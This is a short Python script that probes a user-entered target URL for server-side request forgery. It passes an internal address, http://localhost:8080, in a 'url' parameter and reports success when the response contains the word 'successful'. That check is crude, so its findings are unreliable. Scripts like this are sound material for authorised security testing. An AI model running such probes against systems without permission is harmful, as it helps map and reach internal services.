import requests

def test_ssrf(url):
    payload = "http://localhost:8080"  # Internal server target
    params = {'url': payload}  # Modify based on the target param
    try:
        response = requests.get(url, params=params)
        if "successful" in response.text:
            print(f"[+] SSRF vulnerability found on {url}")
        else:
            print("[-] No SSRF detected")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    target_url = input("Enter target URL: ")
    test_ssrf(target_url)
